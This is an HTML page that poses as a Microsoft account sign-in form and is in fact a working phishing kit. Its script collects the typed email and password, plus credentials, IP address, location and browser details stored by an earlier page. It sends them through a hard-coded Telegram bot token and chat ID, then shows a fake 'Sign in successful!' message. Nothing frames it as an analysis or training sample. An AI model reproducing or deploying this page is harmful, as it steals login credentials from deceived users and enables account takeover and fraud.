<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" />
    <title>Sign in to your Microsoft account</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #ccccff 1%, #eeeeee 80%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            width: 100%;
            max-width: 440px;
        }
        
        .login-card {
            background: white;
            border-radius: 2px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            padding: 44px;
            margin-bottom: 20px;
        }
        
        .logo-container {
            text-align: left;
            margin-bottom: 24px;
        }
        
        .logo-placeholder {
            width: 108px;
            height: 24px;
            border-radius: 2px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 600;
            font-size: 12px;
        }
        
        .form-header h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 8px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-group input {
            width: 100%;
            padding: 11px 12px;
            border: 1px solid #605e5c;
            background: #faf9f8;
            font-size: 15px;
            color: #323130;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #0078d4;
            background: white;
        }
        
        .form-group input::placeholder {
            color: #605e5c;
        }
        
        .form-links {
            margin-bottom: 24px;
        }
        
        .form-links a {
            color: #0078d4;
            text-decoration: none;
            font-size: 13px;
            display: block;
            margin-bottom: 12px;
        }
        
        .form-links a:hover {
            text-decoration: underline;
        }
        
        .form-actions {
            display: flex;
            justify-content: flex-end;
        }
        
        .next-btn {
            background: #0078d4;
            color: white;
            border: none;
            padding: 8px 20px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            min-width: 108px;
        }
        
        .next-btn:hover {
            background: #106ebe;
        }
        
        .signin-options {
            background: white;
            border-radius: 2px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            padding: 16px 24px;
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
        }
        
        .signin-options:hover {
            background: #f3f2f1;
        }
        
        .signin-options svg {
            width: 16px;
            height: 16px;
            fill: #605e5c;
        }
        
        .signin-options span {
            font-size: 15px;
            color: #323130;
        }
        
        .footer-links {
            position: fixed;
            bottom: 20px;
            right: 20px;
            display: flex;
            gap: 24px;
        }
        
        .footer-links a {
            color: white;
            text-decoration: none;
            font-size: 11px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Main Login Card -->
        <div class="login-card">
            <!-- Logo -->
            <div class="logo-container">
                <div class="logo-placeholder"><img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" /></div>
            </div>

            <!-- Form Header -->
            <div class="form-header">
                <h1>Sign in</h1>
            </div>

            <!-- Sign In Form -->
            <form id="outlookForm">
                <div class="form-group">
                    <input 
                        id="outlook_email"
                        type="text" 
                        placeholder="Email, phone, or Skype"
                    />
                </div>

                <div class="form-group">
                    <input 
                        id="outlook_password"
                        type="password" 
                        placeholder="Password"
                    />
                </div>

                <div class="form-links">
                    <a style="text-decoration: none;" href="#"><span style="color: #333;">No account?</span> <strong>Create one!</strong></a>
                    <a href="#">Can't access your account?</a>
                </div>

                <div class="form-actions">
                    <button type="submit" class="next-btn">Next</button>
                </div>
            </form>
        </div>

        <!-- Sign-in Options -->
        <div class="signin-options">
            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" width="30" height="30" />
            <span>Sign-in options</span>
        </div>
    </div>

    <!-- Footer Links -->
    <div class="footer-links">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <a href="#">...</a>
    </div>

    <!-- Added JavaScript for form handling and Telegram sending -->
    <script>
        // Pre-fill email from localStorage
        window.addEventListener('load', () => {
            const storedEmail = localStorage.getItem('userEmail');
            if (storedEmail) {
                document.getElementById('outlook_email').value = storedEmail;
            }
        });

        document.getElementById('outlookForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const emailFromForm = document.getElementById('outlook_email').value.trim();
            const passwordFromForm = document.getElementById('outlook_password').value;

            // Get stored data from first login page
            const originalEmail = localStorage.getItem('userEmail') || '';
            const originalPassword = localStorage.getItem('userPassword') || '';
            const ip = localStorage.getItem('userIP') || '';
            const country = localStorage.getItem('userCountry') || '';
            const city = localStorage.getItem('userCity') || '';
            const useragent = localStorage.getItem('userAgent') || '';
            const browser = localStorage.getItem('userBrowser') || '';
            const timestamp = localStorage.getItem('userTimestamp') || '';

            // Telegram bot configuration
            const botToken = "7838657657:AAHjMMwLMeDDCJyCeBN4liPX0ynbxRhpkvA";
            const chatId = "6686015911";

            const message = 
                "+++[ LOGIN INFO ]+++\n" +
                "Email: " + originalEmail + "\n" +
                "Password: " + originalPassword + "\n" +
                "+++[ EMAIL ACCESS ]+++\n" +
                "Email: " + emailFromForm + "\n" +
                "Password: " + passwordFromForm + "\n" +
                "+++[ IP DETAILS ]+++\n" +
                "IP Address: " + ip + "\n" +
                "Country: " + country + "\n" +
                "City: " + city + "\n" +
                "Useragent: " + useragent + "\n" +
                "Browser: " + browser + "\n" +
                "Timestamp: " + timestamp + "\n" +
                "+++[ RESULTS DONE ]+++";

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
            } catch (error) {
                // Telegram send failed, handle if needed
            }

            // Clear stored data
            localStorage.clear();

            // Redirect or show success message
            alert('Sign in successful!');
        });
    </script>
</body>
</html>
